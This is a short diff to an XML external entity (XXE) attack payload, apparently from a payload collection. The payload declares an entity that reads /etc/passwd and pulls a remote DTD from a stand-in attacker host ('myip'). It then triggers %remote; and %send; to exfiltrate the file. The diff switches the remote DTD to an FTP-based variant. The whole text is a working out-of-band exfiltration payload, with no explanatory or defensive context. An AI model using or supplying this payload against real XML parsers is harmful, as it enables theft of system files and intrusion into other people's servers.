@@ -1,6 +1,6 @@
 <?xml version="1.0"?>
 <!DOCTYPE message [
-    <!ENTITY % remote SYSTEM "http://myip/xml.dtd">  
+    <!ENTITY % remote SYSTEM "http://myip/xml-ftp.dtd">  
     <!ENTITY % file SYSTEM "file:///etc/passwd">
     %remote;
     %send;
